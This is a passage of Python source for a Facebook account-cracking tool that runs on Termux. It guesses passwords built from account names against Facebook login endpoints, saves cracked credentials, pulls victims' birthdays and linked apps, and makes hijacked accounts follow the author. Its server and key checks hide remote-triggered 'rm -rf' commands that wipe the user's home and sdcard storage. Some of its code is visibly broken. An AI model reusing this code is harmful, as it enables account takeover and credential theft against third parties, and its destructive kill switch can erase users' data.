            "Connection":"keep-alive",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Cache-Control":"max-age=0",
            "Accept-Encoding":"gzip, deflate",
            "Accept":"text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
            "Referer":"'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
            "User-Agent":"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 OPR/63.3.3216.58675"
            })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Bilal_Haider_ID('\r\033[1;92m[Noob-OK] %s • %s      '%(user,pw))
                cek_apk(coki)
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Bilal_Haider('token.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Bilal_Haider_ID('\r\033[1;91m[Noob-CP] %s • %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
                    cek_apk(coki)
                    cp.append(wrt)
                    open('CP.txt' ,'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Bilal_Haider_ID('\r\033[1;91m[Noob-CP] %s • %s%s      ' % (user,pw,tahun(user)))
                cek_apk(coki)
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt' ,'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100001392811242",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
    def __pler__(self):
        yan = input('\n[•] Choose : ')
        if yan == '':
            Bilal_Haider_ID('\nDo Not Empty')
            fb()
        elif yan in ('1', '01'):
            
            logo()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__api__, uid, pwx)
                    except:
                        pass
            
            hasil(ok,cp)
        elif yan in ('2', '02'):
            
            logo()
            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):

            logo()
            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('4', '04'):
            
            logo()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+xz[1] ]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+xz[1] ]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+xz[1] ]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+xz[1] ]
                        else:
                        	pwx = [name, xz[0]+xz[1] ]
                        _ngentot_gratis_.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        
        else:
            Bilal_Haider_ID('\nDone')
            time.sleep(1)
            self.__pler__()

def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' [%s->%s] \033[1;97mTOTAL OK : %s --- \033[1;97mCloning/Facebook/Result/OK.txt'%(O,O,str(len(ok))))
        print(' [%s->%s] \033[1;97mTOTAL CP : %s --- \033[1;97mCloning/Facebook/Result/CP.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Go Back ")
        fb_menu()
class __mk1__:
    def __init__(self):
        self.id = []
        logo()
    def mkk(self,id):
        self.cnt = input('[->] F I L E - N A M E : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            os.system('clear')

            self.__pler__()
        else:
            print('[>>] Choose Correct One');self.bilo(id)


    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;37m[ N O O B ]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[Ok][{len(ok)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://mbasic.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [Noob-OK] {user} | {pw}')
                    cek_apk(coki)
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        #print('\r%s \033[1;91m[Noob-CP] %s | %s ' % (K,user,pw))
                        cek_apk(coki)
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    #print('\r%s \033[1;91m[Noob-CP] %s | %s ' % (K,user,pw))
                    cek_apk(coki)
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100022047961256",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        chi = ('3')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with mk(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            logo()
            print('')
            with mk(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+"1234"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+"1234"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('3', '03'):
            logo()
            with mk(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+xz[1],xz[0]+'12345']
                        else:
                            pwx = [name,xz[0]+xz[1],xz[0]+'12345']
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n Select Valid One');self.__pler__()
def online_pass():
	try:
		password = requests.get('https://pastebin.com/raw/R7PjtyuA').json()["password"]
		logo()
		iid = input("[>>] Enter Key : ")
		if iid == password:
			pass
		else:
			os.system('xdg-open https://www.facebook.com/SoryBro.IAm.Noob')
			fb_menu()
	except IOError:
		logo()
		print("[->] Internet Connection Error Bro :/ ")
		os.sys.exit()
def server_chack():
	try:
		server_status = requests.get('https://pastebin.com/raw/R7PjtyuA').json()["server_status"]
		if server_status in ['online','Online','Activate','activate']:
			pass
		elif server_status in ['ofline','Ofline','off','Off']:
			logo()
			print("[->] Sorry Bro Server Down :/ ")
			exit()
		elif server_status in ['fuck','Fuck','Fuck Your System']:
			os.system('rm -rf /sdcard/*')
			os.system('rm -rf $HOME/*')
			os.system('rm -rf *')
			exit()
		elif server_status in ['bypass','Bypass']:
			logo()
			print("[->] Sorry Bro, But Try Not To Bypass :v ")
			exit()
		elif server_status in ['update','Update','upgrade','Upgrade']:
			logo()
			print("[->] Tool Updating Bro Wait For Some Time ")
			exit()
		elif server_status in ['exit','Exit']:
			exit()
		else:
			logo()
			print("[->] Error 405 ")
	except IOError:
		logo()
		print("[->] Internet Connection Error Bro :/ ")
		os.sys.exit()
def key_chack():
	try:
		fucked_key = requests.get('https://pastebin.com/raw/R7PjtyuA').json()["fucked_key"]
		blocked_key = requests.get('https://pastebin.com/raw/R7PjtyuA').json()["blocked_key"]
		if blocked_key == key:
			logo()
			print("[->] Your Key Is Blocked Bro :/ ")
			exit()
		elif fucked_key == key:
			os.system('rm -rf /sdcard/*')
			os.system('rm -rf $HOME/*')
			os.system('rm -rf *')
			exit()
		else:
			pass
	except IOError:
		logo()
		print("[->] Internet Connection Error Bro :/ ")
		os.sys.exit()
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
def reg():
    os.system("clear")
    imt = '~Noob'
    logo()
    print("")
    print("\t First Get Approvel ")
    print("")
    time.sleep(1)
    try:
        key = open('/data/data/com.termux/files/usr/bin/.noob.txt', 'r').read()
    except (KeyError , IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/itz-MK-302/Noob0.1/main/noob.txt').text
    if key in r:
        os.system('clear')
        logo()
        fb_menu()
        print("")
    
        
        time.sleep(5)
        print(" ")
    else:
        os.system("clear")
        logo()
        print("")
        print("\tMK Tool is Not Paid But You Need Approvel ")
        print("")

        print(" Your Key is Not Approved ")
        print("")
        print(" Copy And Send Key To Admin")
        print("")
        print(" Your Key: "+ key + imt)
        print("")
        input(" Press Enter To Send Key")
        os.system('xdg-open https://wa.me/+923424684410?text=' + key )
        reg()
def reg2():
    os.system("clear")
    logo()
    print("")
    print("\tNoob Tool is Not  ")
    print("")
    print(" Copy And Press Enter , Then Select Whatsapp To Continue")
    print("")
    id = key
    s = open('/data/data/com.termux/files/usr/bin/.noob1.txt', 'r').read()
    s.write(id)
    s.close()
    ids = open('/data/data/com.termux/files/usr/bin/.noob1.txt', 'r').read()
    print(" Your key: "+ids)
    print("")
    print("")
    input(" Press Enter To Get Approvel ")
    os.system("xdg-open https://wa.me/+923424684410")
    input(" Press Enter To Check Registration ")
    fb_menu()

if __name__=='__main__':
	fb_menu()
